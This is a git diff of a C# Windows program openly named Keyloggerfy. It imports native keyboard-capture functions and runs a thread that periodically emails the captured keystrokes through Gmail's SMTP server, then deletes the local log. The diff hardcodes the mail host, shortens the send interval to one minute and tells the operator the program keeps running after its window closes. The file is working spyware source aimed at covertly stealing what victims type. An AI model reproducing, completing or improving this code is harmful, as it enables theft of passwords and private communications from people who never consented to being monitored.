@@ -23,13 +23,7 @@ namespace Keyloggerfy
         }
 
 
-        #region PANEL BARRA TITULO        
-        //METODO PARA ARRASTRAR EL FORMULARIO
-        [System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
-        private extern static void ReleaseCapture();
-        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
-        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
-
+        #region PANEL BARRA TITULO             
         //BOTONES DEL PANEL DE TITULO
         private void btnCerrar_Click(object sender, EventArgs e)
         {
@@ -64,6 +58,14 @@ namespace Keyloggerfy
         #endregion
 
         #region METODOS NATIVOS KEYLOGGER
+        //METODO PARA ARRASTRAR EL FORMULARIO
+        [System.Runtime.InteropServices.DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
+        private extern static void ReleaseCapture();
+
+        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
+        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
+
+        //METODOS PARA ACCEDER A LA CAPTURA DE TECLAS
         [DllImport("User32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         internal static extern bool GetKeyboardState(byte[] lpKeyState);
@@ -185,7 +187,7 @@ namespace Keyloggerfy
             }
         }
         
-        static void sendMail(int hourOne, int hourTwo, String host, Int32 port, String mailTo, String mailFrom, String password)
+        static void sendMail(int hourOne, int hourTwo, String mailTo, String mailFrom, String password)
         {
             Mutex mut = new Mutex();
             string driveName = DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Fixed).FirstOrDefault().Name;
@@ -200,7 +202,7 @@ namespace Keyloggerfy
 
                     DateTime previous_time = DateTime.Now;
                     //SENDS AN E-MAIL WITH THE KeysStroked EVERY 10 MINUTES
-                    Thread.Sleep(600000);
+                    Thread.Sleep(60000);
 
                     MailAddress to = new MailAddress(mailTo);
                     
@@ -210,36 +212,37 @@ namespace Keyloggerfy
 
                     mail.Subject = "KeysStroked between " + previous_time + " and " + DateTime.Now;
 
-                    if (File.Exists(path))
+                    using(SmtpClient smtp = new SmtpClient())
                     {
-                        mut.WaitOne();
-                        mail.Body = File.ReadAllText(path);
-                        mut.ReleaseMutex();
-                        SmtpClient smtp = new SmtpClient();
+                        if (File.Exists(path))
+                        {
+                            mut.WaitOne();
+                            mail.Body = File.ReadAllText(path);
+                            mut.ReleaseMutex();
+                            //SmtpClient smtp = new SmtpClient();
 
-                        smtp.Host = host;
+                            smtp.Host = "smtp.gmail.com";
 
-                        smtp.Port = port;
-                        smtp.EnableSsl = true;
+                            smtp.Port = 587;
+                            smtp.EnableSsl = true;
 
-                        smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
+                            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
 
-                        smtp.UseDefaultCredentials = false;
-                        
-                        smtp.Credentials = new NetworkCredential(
-                            mailFrom, password);
-                        
-                        smtp.Send(mail);
-                        mut.WaitOne();
-                        File.Delete(path);
-                        mut.ReleaseMutex();
-                    }
+                            smtp.UseDefaultCredentials = false;
+
+                            smtp.Credentials = new NetworkCredential(
+                                mailFrom, password);
+
+                            smtp.Send(mail);
+                            mut.WaitOne();
+                            File.Delete(path);
+                            mut.ReleaseMutex();
+                        }
+                    }                    
                 }
             }
         }
-
-        String host;
-        Int32 port;
+        
         Int32 hourOne;
         Int32 hourTwo;
         String mailTo;
@@ -248,8 +251,8 @@ namespace Keyloggerfy
 
         private void btnComenzar_Click(object sender, EventArgs e)
         {            
-            if(cboxTimeStart.SelectedItem == null || cboxTimeEnd.SelectedItem == null || !String.IsNullOrWhiteSpace(txbMailTo.Text)
-                || !String.IsNullOrWhiteSpace(txbMailFrom.Text) || !String.IsNullOrWhiteSpace(txbPassword.Text) || cboxMailProvider.SelectedItem == null )
+            if(cboxTimeStart.SelectedItem == null || cboxTimeEnd.SelectedItem == null || String.IsNullOrWhiteSpace(txbMailTo.Text)
+                || String.IsNullOrWhiteSpace(txbMailFrom.Text) || String.IsNullOrWhiteSpace(txbPassword.Text) )
             {
                 MessageBox.Show("You need to fill all the boxes dude",
                 "Hey, you forgot something...", MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -272,23 +275,7 @@ namespace Keyloggerfy
                 hourTwo = Convert.ToInt32(cboxTimeEnd.SelectedItem);
                 mailTo = txbMailTo.Text;
                 mailFrom = txbMailFrom.Text;
-                password = txbPassword.Text;
-
-                if (cboxMailProvider.SelectedIndex == 0)
-                {
-                    host = "smtp.gmail.com";
-                    port = 587;
-                }
-                else if (cboxMailProvider.SelectedIndex == 1)
-                {
-                    host = "smtp.live.com";
-                    port = 465;
-                }
-                else if (cboxMailProvider.SelectedIndex == 2)
-                {
-                    host = "smtp-mail.outlook.com";
-                    port = 465;
-                }
+                password = txbPassword.Text;         
 
                 Thread thread_Logger = new Thread(() =>
                 {
@@ -298,9 +285,12 @@ namespace Keyloggerfy
 
                 Thread thread_Mail = new Thread(() =>
                 {
-                    sendMail(hourOne, hourTwo, host, port, mailTo, mailFrom, password);
+                    sendMail(hourOne, hourTwo, mailTo, mailFrom, password);
                 });
                 thread_Mail.Start();
+
+                MessageBox.Show("Nice, everything running as expected, now you can close Keyloggerfy, read close the exit message.",
+                "Thats it", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }            
         }        
     }
